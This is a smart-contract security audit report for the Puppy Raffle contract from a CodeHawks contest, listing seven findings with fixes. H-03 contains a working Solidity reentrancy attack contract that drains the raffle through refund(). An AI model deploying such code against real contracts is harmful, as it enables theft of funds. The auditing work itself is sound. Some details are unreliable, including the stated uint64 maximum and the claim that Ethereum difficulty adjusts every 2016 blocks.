# First Flight #2: Puppy Raffle - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. TotalFees integer overflow](#H-01)
    - ### [H-02. Refund breaks the game](#H-02)
    - ### [H-03. Reentrancy attack on Refund](#H-03)
    - ### [H-04. Winner Front-Running](#H-04)
    - ### [H-05. Weak PRNG at selectWinner](#H-05)
- ## Medium Risk Findings
    - ### [M-01. Fees Withdraw Fails if Rounding](#M-01)
- ## Low Risk Findings
    - ### [L-01. getActivePlayerIndex returns valid index if player not found](#L-01)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #2

### Dates: Oct 25th, 2023 - Nov 1st, 2023

[See more contest details here](https://www.codehawks.com/contests/clo383y5c000jjx087qrkbrj8)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 5
   - Medium: 1
   - Low: 1


# High Risk Findings

## <a id='H-01'></a>H-01. TotalFees integer overflow            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L134

## Summary
Fees calculation during the `selectWinner` can lead to integer overflow when calculating the `totalFees`.

## Vulnerability Details
There are two problems with fees calculation here `totalFees = totalFees + uint64(fee);` at line 134.
1. If `uint256 fee` is converted to `uint64`, and the value of fee is greater than 2^(64-1) (max value of uint64), then integer overflow will happen, leading to the wrapping of the final value, which will be equal to `fee % 2^(64-1)`, and `uint64(fee)` will lead to wrong value.
2. If `totalFees + uint64(fee)` will exceed the max value `uint64`, then another overflow will happen, since the sum is not validated, like in `SafeMath` libs, since the Solidity version is lower than `0.8.0`

## Impact
- Invalid values of `totalFees`
- Owner of the contract cannot withdraw fees, since `withdrawFee` validates the smart contract balance is equal to `totalFees`

## Recommendations
- Use `SafeMath` lib to handle integer overflows correctly
- Set `totalFees` as `uint256`, since all other variables are `uint256` and sums will likely cause overflow. Keep variable types consistent.
## <a id='H-02'></a>H-02. Refund breaks the game            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L96

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L131

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L151

## Summary
After the refund, game is broken since funds cannot be sent to the winner.



## Vulnerability Details
After the refund, `selectWinnter()` is broken.
- `refund` doesn't change the array length, but replaces the valid player with zero address.
- `selectWinner` method uses the `players.length` to calculate the `totalAmountCollected`, and if the refund has happened, contract will have less funds available than it's calculated in `totalAmountCollected`, and then `winner.call{value: prizePool}("");` will always fail until the contract has extra gas for the deleted players.

## Impact
Smart contract is broken and unplayable, once at least one user has been refunded.

## Recommendations
Either remove the element from the array, or calculate fees from all non-zero addresses at `totalAmountCollected`. Later one seems more gas-efficient, since no array modifications are required.

```solidity
        uint256 totalAmountCollected;
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] != address(0)) {
                totalAmountCollected += entranceFee;
            }
        }
```
## <a id='H-03'></a>H-03. Reentrancy attack on Refund            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L101

## Summary
Attacker can reenter the `refund` function since state is modified after the funds have been sent.

## Vulnerability Details
Attacker can modify the receive/fallback functions and re-call the refund functions until it's fully drained.

## Impact
Account will be drained


## Tools Used
```solidity
interface IPuppyRaffle {
    function refund(uint256 playerIndex) external;
    function enterRaffle(address[] memory newPlayers) external payable;
    function getActivePlayerIndex(address player) external view returns (uint256);
    function selectWinner() external;
    function withdrawFees() external;
}

contract ReentrancyAttack {
    IPuppyRaffle public raffle;
    address[] private players;

    constructor(address _raffle) {
        raffle = IPuppyRaffle(_raffle);
    }

    receive() external payable {
        if (address(raffle).balance > 0) {
            raffle.refund(0);
        }
    }

    function startGame() external payable {
        players.push(address(this));
        players.push(...);

        raffle.enterRaffle{value: msg.value}(players);

        delete players;
    }

    function attack() external payable {
        raffle.refund(0);
    }
}
```

## Recommendations
Delete player from `players` list before sending the ether back

```solidity
    function refund(uint256 playerIndex) public {
        ...
        players[playerIndex] = address(0);
        payable(msg.sender).sendValue(entranceFee);
        ...
    }
```
## <a id='H-04'></a>H-04. Winner Front-Running            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L125

## Summary
The `selectWinner` function is vulnerable to front-running attacks. Specifically, by observing a legitimate transaction that invokes this function in the mempool, an attacker can preemptively send their own transaction with a higher gas fee to manipulate the outcome of the winner selection and possibly profit from the subsequent prize distribution.

## Vulnerability Details
### Predictable Randomness:
The function uses msg.sender, block.timestamp, and block.difficulty as seed values for the keccak256 hash function to generate "randomness". However, two of these values (msg.sender and block.timestamp) can be controlled or influenced by the attacker, especially when they are front-running.

### Gas Price Manipulation:
Since Ethereum miners prioritize transactions offering higher gas fees, an attacker can observe the selectWinner transaction in the mempool and send a similar transaction with a higher gas price. By doing so, the attacker ensures that their transaction is mined before the original one.

### Manipulated Outcome:
By preempting the original transaction, the attacker's transaction becomes the one to set the block.timestamp and uses the attacker's address for msg.sender, which in turn influences the outcome of the winner selection.

## Impact
Unfair Winner Selection

## Recommendations
### Use External Randomness:
Employ services like Chainlink VRF (Verifiable Random Function) which provide on-chain verifiable randomness that is hard to manipulate.
### Use More Complex Ways to Determine the Winner
- Commit-Reveal techniques
- zk-solutions
### Use only private mempools
- Batching providers like Flashbots, etc.
## <a id='H-05'></a>H-05. Weak PRNG at selectWinner            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L129

## Summary
`selectWinner` relies on parameters that can be manipulated by the players/miners.


## Vulnerability Details
The line 129:

`uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;`, 

uses block metadata for choosing the random winner, which can be manipulated to some extent:

1. `block.timestamp`, which can be manipulated by the miners.
2. `block.difficulty`, which can be predicted to some extent and, moreover, it adjusts only every 2016 blocks in Ethereum, and it remains constant for many blocks at a stretch.
3. `msg.sender`, which is constant and might give a small sense of the pattern

## Impact
Bad players can manipulate the results of the game

## Recommendations
Avoid using weak randomizing parameters like block.timestamp and block.metadata. For a more robust randomness solution in Solidity, consider using something like Chainlink VRF (Verifiable Random Function). Chainlink VRF provides provably-random numbers that are verifiable on-chain and are resistant to manipulation by any party, including miners.
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. Fees Withdraw Fails if Rounding            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L132

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L133

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L158

## Summary
`withdrawFees` can fail, because the equation `address(this).balance == uint256(totalFees)` is too strict. 

If the account hasn't exactly the same ether as `totalFees`, withdraw is impossible, This situation is very likely, if rounding will happen during calculation of the `totalFees` and `prizePool`.

## Vulnerability Details
Let's break down the numbers:

1. If there are 9 players and each pays an entrance fee of 1,000,000,000,000,001 wei:

2. The total fees collected will be 20% of the entrance fees:
1,000,000,000,000,001 (entrance fee) x 9 (players) x 0.2 = 1,800,000,000,000,001.8.
Solidity rounds this down to 1,800,000,000,000,001.

3. The prize pool will be 80% of the entrance fees:
1,000,000,000,000,001 (entrance fee) x 9 (players) x 0.8 = 7,200,000,000,000,007.2.
This gets rounded down to 7,200,000,000,000,007.

4. Before distributing the prize, our account holds:
1,000,000,000,000,001 x 9 = 9,000,000,000,000,009 wei.

5. After giving out the prize, our account will have:
9,000,000,000,000,009 - 7,200,000,000,000,007 = 1,800,000,000,000,002 wei left.

However, notice that the calculated total fees are 1,800,000,000,000,001, which is 1 wei less than the difference above.

## Impact
`withdrawFee` is never permitted, i.e. funds can never be withdrawn.

## Tools Used
- Math

## Recommendations
`require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");` is used only to validate that the game is finished and `selectWinner` has been called. 

After each successful `selectWinner` the `players` array is reset with `delete`, which will reset the array length to zero.
It would be ok, to replace the above validation with this:

```solidity
require(players.length == 0, "PuppyRaffle: There are currently players active!");
require(totalFees > 0, "PuppyRaffle: No fees to withdraw");
```

# Low Risk Findings

## <a id='L-01'></a>L-01. getActivePlayerIndex returns valid index if player not found            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L116C12-L116C12

## Summary
The function `getActivePlayerIndex` loops through array and returns 0 if players has not been found. This is ambiguous since 0 is a valid index for array in Solidity.

## Vulnerability Details
Function returns 0, which is a valid array index.

## Impact
Misleading return value

## Recommendations
Either:
- Return -1 as int256
- Return uint256 max value and make it explicit to the consumer of the contract
- Revert with error


